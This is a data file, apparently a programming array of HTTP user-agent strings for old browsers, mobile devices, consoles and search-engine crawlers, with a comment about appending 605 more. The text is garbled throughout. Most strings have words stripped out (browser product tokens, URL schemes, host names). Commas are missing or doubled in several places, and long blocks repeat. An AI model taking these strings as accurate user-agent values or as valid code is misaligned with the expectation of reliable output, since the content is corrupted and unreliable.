	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322"
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/4.0 ; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322",
	"/2.1 ://.com/.html",
	"/9.20 Windows NT 6.0; U; ",
	"/5.0 X11; U; Linux i686; -US; rv:1.8.1.1 Gecko/20061205 Iceweasel/2.0.0.1 -2.0.0.1+-2",
	"/4.0 ; MSIE 7.0; Windows NT 5.1; /4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322",
	"/10.00 X11; Linux i686; U;  Presto/2.2.0",
	"/5.0 Windows; U; Windows NT 6.0; -IL /528.16 KHTML,  Gecko /4.0 Safari/528.16",
	"/5.0 ; Yahoo! /3.0; ://.yahoo.com//us/ysearch/",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.13 Gecko/20101209 Firefox/3.6.13",
	"/4.0 ; MSIE 9.0; Windows NT 5.1; /5.0",
	"/5.0 ; MSIE 8.0; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727",
	"/4.0 ; MSIE 7.0b; Windows NT 6.0",
	"/4.0 ; MSIE 6.0b; Windows 98",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/4.0 .NET CLR 3.5.30729",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.8 Gecko/20100804 Gentoo Firefox/3.6.8",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.2.7 Gecko/20100809 /3.6.7-1.fc14 Firefox/3.6.7",
	"/5.0 ; /2.1; +://.com/.html",
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/",
	"YahooSeeker/1.2 ;  4.0; MSIE 5.5; yahooseeker  yahoo-inc  com ; ://.yahoo.com//us///",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; .NET CLR 2.0.50727; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"/4.0 ; MSIE 6.1; Windows XP",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"-; +://.com/; : webetrex",
	"/5.0 ; MSIE 9.0; AOL 9.7;  4343.19; Windows NT 6.1; WOW64; /5.0; FunWebProducts",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.27; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.21; Windows NT 5.1; /4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/4.0 ; MSIE 7.0; AOL 9.7;  4343.19; Windows NT 5.1; /4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E"
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1",
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",
	"/5.0 Windows; U; Windows NT 6.1; ; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/5.0 Windows; U; Windows NT 5.2; -; rv:1.9.1.3 Gecko/20090824 Firefox/3.5.3 .NET CLR 3.5.30729",
	"/5.0 Windows; U; Windows NT 6.1; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1 .NET CLR 3.0.04506.648",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.1 KHTML,  Gecko /4.0.219.6 Safari/532.1",
	"/4.0 ; MSIE 8.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2",
	"/9.60 J2ME/MIDP;  Mini/4.2.14912/812; U;  Presto/2.4.15",
	"/5.0 Macintosh; U; PPC Mac OS X; -US /125.4 KHTML,  Gecko, Safari OmniWeb/v563.57",
	"/5.0 SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; /MIDP-2.0 /CLDC-1.1  /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.2; Win64; x64; /4.0",
	"/5.0 Windows; U; WinNT4.0; -US; rv:1.8.0.5 Gecko/20060706 K-/1.0",
	"Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/",
	"/4.76 [] PalmOS; U; WebPro/; Palm-Arz1",
	"/5.0 Macintosh; U; PPC Mac OS X; - /418 KHTML,  Gecko /1.2.2 Safari/125",
	"/5.0 X11; U; Linux i686 x86_64; -US; rv:1.8.1.6 Gecko/2007072300 Iceweasel/2.0.0.6 -2.0.0.6-0etch1+lenny1",
	"/5.0 SymbianOS/9.1; U; -us /413 KHTML,  Gecko Safari/413",
	"/4.0 ; MSIE 6.1; Windows NT 5.1; /4.0; SV1; .NET CLR 3.5.30729; InfoPath.2",
	"/5.0 Windows; U; MSIE 7.0; Windows NT 6.0; -US",
	"Links 2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25",
	"/4.0 ; MSIE 6.0; Windows NT 5.0; WOW64; /4.0; SLCC1",
	"/1.22 ; Konqueror/4.3; Linux KHTML/4.3.5  Gecko",
	"/4.0 ; MSIE 6.0; Windows CE;  6.5",
	"/9.80 Macintosh; U; - Presto/2.8.131 /11.10",
	"/5.0 X11; U; Linux i686; -US; rv:1.9.1.9 Gecko/20100318 /2.0.4-69.1mib2010.0 SeaMonkey/2.0.4",
	"/4.0 ; MSIE 6.1; Windows XP Gecko/20060706 /7.0",
	"/5.0 ; U; CPU OS 3_2  Mac OS X; -us /531.21.10 KHTML,  Gecko /4.0.4 /7B334b Safari/531.21.10",
	"/5.0 Macintosh; I; Intel Mac OS X 10_6_7; -",
	"/5.0 ; MSIE 9.0; Windows NT 6.1; /5.0",
	"/1.22 ; MSIE 6.0; Windows NT 6.1; /4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729;  Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3",
	"/5.0 ; /3.0; +://yandex.com/bots",
	"/4.0 Macintosh; U; Intel Mac OS X 10_6_7; -US /534.16 KHTML,  Gecko /10.0.648.205 Safari/534.16",
	"/1.22 X11; U; Linux x86_64; -US; rv:1.9.1.1 Gecko/20090718 Firefox/3.5.1",
	"/5.0 ; MSIE 2.0; Windows NT 6.1; WOW64; /4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2",
	"/9.80 Windows NT 5.2; U;  Presto/2.5.22 /10.51",
	"/5.0 ; MSIE 2.0; Windows CE;  7.0",
	"/4.0 Macintosh; U; PPC Mac OS X; -US",
	"/5.0 Windows; U; Windows NT 6.0; ; rv:1.9.1.7 Gecko/20091221 Firefox/3.5.7",
	"BlackBerry8300/4.2.2 /MIDP-2.0 /CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0",
	"/1.22 ; MSIE 2.0; Windows 3.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;  Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322",
	"/3.0 Windows NT 6.1; -; rv:1.9.1.3. Win32; x86 Firefox/3.5.3 .NET CLR 2.0.50727",
	"/7.0 ; MSIE 2.0; Windows 3.1"
	"/9.80 Windows NT 5.1; U; -US Presto/2.8.131 /11.10",
	"/4.0 ; MSIE 6.0;   Browser 1.1; rev1.5; Windows NT 5.1;",
	"/5.0 Windows; U; Windows CE 4.21; rv:1.8b4 Gecko/20050720 Minimo/0.007",
	"BlackBerry9000/5.0.0.93 /MIDP-2.0 /CLDC-1.1 VendorID/179",
	"/5.0 ; 008/0.83; ://www.80legs.com/webcrawler.html Gecko/2008032620",
	"/4.0 ; MSIE 7.0; Windows NT 6.0  www.idealobserver.com",
	"/5.0 ; /1.0; +://www.anyapex.com/.html",
	"/4.0 ; Arachmo",
	"/4.0 ; B-l-i--z-B-O-T",
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html",
	"/5.0 ; Baiduspider/2.0; +://.com/search/spider.html",
	"/5.0 ; /2.3; MSIE 6.0 ; +://.com/site_owners.html",
	"/1.0 +://.com/crawler/",
	"/5.0 ; /2.0; +://.com/.htm",
	"Sqworm/2.9.85-BETA beta_release; 20011115-775; i686-pc-linux-",
	"/5.0 ; YandexImages/3.0; +://yandex.com/bots",
	"/5.0 ; Yahoo! ; ://.yahoo.com//us/ysearch/",
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; ",
	"/5.0 ; /1.0; ://www.yodao.com//webmaster/spider/; ",
	"/4.0  /1.0  Link Checker @; ://.com",
	"/4.0  /1.0  Link Checker .dlc@; ://.com",
	"/4.0  /1.0 -@; ://.com",
	"/5.0 ; U;  0.6;  /420+ KHTML,  Gecko",
	"/5.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729",
	"/4.0 ; MSIE 8.0; Windows NT 5.1; /4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729;  Browser",
	"/4.0 ; MSIE 8.0; Windows NT 6.0; /4.0; Acoo Browser; GTB6; /4.0 ; MSIE 6.0; Windows NT 5.1; SV1 ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727",
	"/5.0 Macintosh; U; PPC Mac OS X;  /419 KHTML,  Gecko, Safari/419.3 /1.0.ALPHA",
	"/5.0 Windows; U; Windows NT 5.1; -US /532.2 KHTML,  Gecko ChromePlus/4.0.222.3 /4.0.222.3 Safari/532.2",
	"/5.0 Windows; U; Windows NT 6.1; -US /534.10 KHTML,  Gecko /8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1",
	"Links 2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; ",
	"/5.0 Macintosh; Intel Mac OS X 10_9_3 /537.75.14 KHTML,  Gecko /7.0.3 Safari/7046A194A",
	"/5.0 PLAYSTATION 3; 3.55",
	"/5.0 PLAYSTATION 3; 2.00",
	"/5.0 PLAYSTATION 3; 1.00",
	"/5.0 Windows NT 6.3; WOW64; rv:24.0 Gecko/20100101 /24.4.0",
	"/5.0 ; /1.0; +://www.abilogic.com/.html",
	"SiteBar/3.3.8 Bookmark Server; :///",
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -",
	"iTunes/9.0.3 Macintosh; U; Intel Mac OS X 10_6_2; -",
	"/4.0 ;  3.0; Macintosh",
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 FM  4.6.1",
	"/5.0 Windows; U; Windows NT 5.1; ; rv:1.9.2.3 Gecko/20100401 Firefox/3.6.3 .NET CLR 3.5.30729 Prevx 3.0.5 ",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.8.1.8 Gecko/20071004 Iceweasel/2.0.0.8 -2.0.0.6+2.0.0.8-Oetch1",
	"/5.0 Windows; U; Windows NT 5.2; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; {1C69E7AA-C14E-200E-5A77-8EAB2D667A07}",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; acc=baadshah; acc=;  DSL 1.1; ",
	"/4.0 ; MSIE 5.5; Windows 98",
	"/4.0 ; MSIE 6.0; Windows NT 5.1;   8.51",
	"/5.0 Windows; U; Windows NT 5.1; -US; rv:1.8.0.1 Gecko/20060111 Firefox/1.5.0.1",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; snprtz|S26320700000083|2600# Pack 1#2#5#154321|",
	"/4.0 ; MSIE 6.0; Windows NT 5.1; SV1;  Toolbar; ; .NET CLR 1.1.4322",
	"/5.0 Macintosh; U; PPC Mac OS X; - /417.9 KHTML,  Gecko Safari/417.8",
	"/5.0 X11; U; Linux x86_64; -US; rv:1.9.1.3 Gecko/20090913 Firefox/3.5.3",

        
	
# Gakusei is  605 new Useragents_Append under 

	"Privoxy/1.0",
	"*/Nutch-0.9-dev",
	"+//1.0 +  Day",
	"-DIE-KRAEHE- META-SEARCH-ENGINE/1.1 ://-",
	"123spider- : 1.02  by ",
	"",
	" ZipCommander  - ://www.zipcommander.com/",
	"2Bone_LinkChecker/1.0 libwww-perl/5.64",
	".com LinkChecker v2.0",
	"8484   v 1.0"
	":/1.0 linux   -mail:  :////search/.html ",
	"A- Search",
	"A1  Research/1.0.2 +://www.micro-sys.dk/products/-research/ /2007.03.27",
	"A1  Generator/1.0 +://www.micro-sys.dk/products/-generator/ /2006.01.24",
	"AbachoBOT",
	"AbachoBOT  ",
	"ABCdatos BotLink/5.xx.xxx#BBL",
	"  	  Germany",
	"/0.1 ; ://.com; @.com",
	"/0.1libwww-perl/5.47",
	"Accelatech RSSCrawler/0.4",
	" 	 Search ",
	"-AI-/1.1.1 crawler    com",
	"-AI-/1.1.2 aicrawler    com",
	" Explorer",
	"Ack ://www.ackerm.com/",
	"",
	"  v1.50.001",
	"  v1.52 ://",
	"- 4.0.x.[xx] ://",
	"- v3.xx ://  ://.com",
	"/Nutch-0.9 - Search ; ;     ",
	"ActiveBookmark 1.x",
	"Activeworlds",
	"ActiveWorlds/3.xx xxx",
	" Muncher v4.xx.x",
	" Muncher v4x  xxxxx",
	"Adaxas Spider :///",
	" Browser ://www.avantbrowser.com",
	"AESOP_com_SpiderMan",
	"/1.x.x +://",
	"-/2.0++://.com",
	"/0.1 libwww-perl/5.48",
	"AIBOT/2.1 By +www.21seek.com A Real artificial  search  ",
	"AideRSS/1.0 aiderss.com",
	"/1.0 ; ://.com; @.com",
	"/2-  dev; ://.com; @.com",
	"Akregator/1.2.9; librss/remnants",
	"/3.324",
	"Alcatel-BG3/1.0 UP.Browser/5.0.3.1.2",
	" Spider/1.0 +://.com/",
	"AlertInfo 2.0  by ",
	"AlkalineBOT/1.3",
	"AlkalineBOT/1.4 1.4.0326.0 RTM"
	"Allesklar/0.1 libwww-perl/5.46",,
	"Alligator 1.31 .com",
	"Allrati/1.1 +",
	"  V2.0 AVS EVAL search@.com",
	"  V2.0 Compaq  Eval @",
	"  V2.0 .com crawler@.com",
	" V2.0B crawler@.com",
	"/x.xx libwww/x.x.x",
	"AmfibiBOT",
	"/0.06 Amfibi Web Search; ://www.amfibi.com; @amfibi.com",
	"/0.07 Amfibi ; ://www.amfibi.com; @amfibi.com",
	"",
	"-AWeb/3.4.167SE",
	"AmigaVoyager/3.4.4 MorphOS/PPC ",
	"AmiTCP Miami AmigaOS 2.04",
	"Amoi 8512/R21.0 NF-Browser/3.3",
	"amzn_assoc",
	" spider 0.1  - ://",
	"annotate_google; :////annotate_google.user.js",
	" by ProxyOS: ://www.megaproxy.com",
	"Anonymizer/1.1",
	"AnswerBus ://www.answerbus.com/",
	"  x.0",
	" x.0",
	"ANTFresco/x.xx",
	"-V1.1.5/i586-linux-2.2",
	"AnzwersCrawl/2.0 anzwerscrawl@;",
	"Apexoo Spider 1.x",
	"Aplix HTTP/1.0.1",
	"Aplix_SANYO_browser/1.x ",
	"Aplix_SEGASATURN_browser/1.x ",
	"",
	" 1.1 www.walhello.com",
	"  v1.1.4  v1.0.0.4A102",
	"-PubSub/65.1.1",
	" ; /5.0; ; FAST Crawler 6.4; ://www.araby.com;",
	" @euroseek.com",
	"ArchitextSpider",
	".org_bot",
	"Argus/1.1 Nutch; ://www.simpy.com/.html; feedback  simpy  com",
	"Arikus_Spider",
	"Arquivo-web-crawler ; heritrix/1.12.1 +://arquivo-",
	"ASAHA Search  Turkey V.001 ://.com/",
	"-/1.x",
	"-/1.x .pl/x.x ; .pl/x.x",
	"ask.24x.info",
	"AskAboutOil/0.06- Nutch; :///docs//.html; nutch-@askaboutoil.com",
	"/Nutch-0.8 web crawler; ://; epicurus  gmail  com",,
	"ASPSeek/1.2.5",
	"ASPseek/",
	"ASPSeek/1.2.x",
	"ASPSeek/",
	"ASPseek/1.2.xx",
	"ASPSeek/",
	"ASSORT/0.10",
	"asterias/2.0",
	"/1.1 +://www.atlocal.com/local-web--owner.html",
	"Atomic_Email_Hunter/4.0",
	"Atomz/1.0",
	"atSpider/1.0",
	"Attentio/Nutch-0.9-dev Attentios   crawler; www.attentio.com; info@attentio.com",
	"AU-MIC/2.0 MMP/2.0",
	"AUDIOVOX-SMT5600",
	" V-1.x",
	"autoemailspider",
	"autowebdir 1.1 www.autowebdir.com",
	"AV Fetch 1.0",
	" Browser ://www.avantbrowser.com",
	"AVSearch-1.0peter.turney@",
	"AVSearch-2.0-fusionIdx-14-CompetitorWebSites",
	"AVSearch-3.0/AVC",
	"AWeb",
	"/  Crawler; :///; ",
	" -  your  for better   www.axmo.com search .",
	"Azureus 2.x.x.x",
	"BabalooSpider/1.3 BabalooSpider; ://www.babaloo.si; spider@babaloo.si",
	"/1.x.x +://www.baboom.us",
	" Browser 3.x",
	"BaiduImagespider++:///search/s308.html",
	"BaiDuSpider",
	"Baiduspider++:///system/05.html",
	"Baiduspider++://.com/search/spider.htm",
	"Baiduspider++://.com/search/spider_jp.html",
	"Balihoo/Nutch-1.0-dev Crawler for Balihoo.com search  - obeys   robots  tags ; ://balihoo.com/index.aspx;   balihoo  com",
	"BanBots/1.2 spider@banbots.com"
	"/2.0.xxxx",
	"BarcaPro/1.4.xxxx",
	"BarraHomeCrawler albertof@",
	"bCentral  -Process",
	"bdcindexer_2.6.2 research@bdc",
	"BDFetch",
	"BDNcentral Crawler v2.3 [] ://www.bdncentral.com/.html X11; I; Linux 2.0.44 i686",
	"/0.5  link remover of ",
	"/1.0 +:///crawler//",
	"/2.5.1  crawler :///.html ",
	"BeebwareDirectory/v0.01",
	" Brother ://.fr/~fpottier/",
	" Fish v1.0",
	"BigBrother/",
	"BigCliqueBOT/1.03-dev ; ://.com; @.com",
	"BIGLOTRON  2;GNU/Linux",
	"/Nutch-x.x-dev   Spider; :///; info@.com",
	"Bilbo/2.3b-UNIX",
	"/0.8-dev bilgi.com  ; :///nutch/.html; nutch-@",
	"/1.0 ://www.bilgi.com/; bilgi  bilgi  com",
	" wjj@",
	" /1.1",
	"  V:1.0; ://.com",
	"Biyubi/x.x  Fenix; G11;  Toledo; es-mx",
	"BlackBerry7520/4.0.0 /MIDP-2.0 /CLDC-1.1 UP.Browser/5.0.3.3 UP.Link/5.1.2.12  WAP Proxy/1.0",
	"BlackWidow",
	"BlackWidow",
	"Blaiz-/1.0 +://",
	"Blaiz-/2.00.8222 BE  Search  ://.com",
	"Blaiz-/2.00.xxxx +://",
	"BlitzBOT@",
	"BlitzBOT@  ",
	"/1.x",
	" 2.13 ://.com/",
	"Bloglines  Fetch/1.0 ://www.bloglines.com",
	"Bloglines-Images/0.1 ://www.bloglines.com",
	"Bloglines/3.1 ://www.bloglines.com",
	" ://",
	" info@.com",
	" @.com",
	"BlogSearch/1.x +://.com/",
	"--3",
	" V 2.01 +://www.blogsnow.com/",
	"-v1.1 spider@.nl",
	"blogWatcher_Spider/0.1 :///blogWatcher/",
	"/1.0 +://.com; rhodes@.com",
	"/1.0 +://.com/",
	"/Nutch-0.9  Crawler for Research - obeys   robots  tags ; ://balihoo.com/index.aspx;   balihoo  com",
	"bluefish 0.6 HTML editor",
	"BMCLIENT",
	"BMLAUNCHER",
	"Bobby/4.0.x RPT-/0.3-3E",
	"boitho.com-dc/0.xx ://www.boitho.com/.html",
	"boitho.com-/1.x",
	"boitho.com-/1.x ://www.boitho.com/.html",
	"/x.x",
	"Bookmark Buddy bookmark checker :///",
	"Bookmark Renewal Check  [:///]",
	"Bookmark Renewal Check  [:///]",
	"2/;://.com",
	" mailto:@yahoo.com",
	"BPImageWalker/2.0 .com",
	"  MarcoPolo",
	"BrightCrawler ://.com/",
	" +:///.html",
	"BSDSeek/1.0",
	"  Detector",
	"/0.x +://.com/.html",
	"/180B9704",
	"BuildCMS crawler ://www.buildcms.com/crawler",
	"Bulkfeeds/r1752 :///",
	"@.com",
	"BunnySlippers",
	"BurstFindCrawler/1.1 .com; ://.com; crawler@.com",
	"Buscaplus Robi/1.0 ://www.buscaplus.com/robi/",
	"BW-C-2.0",
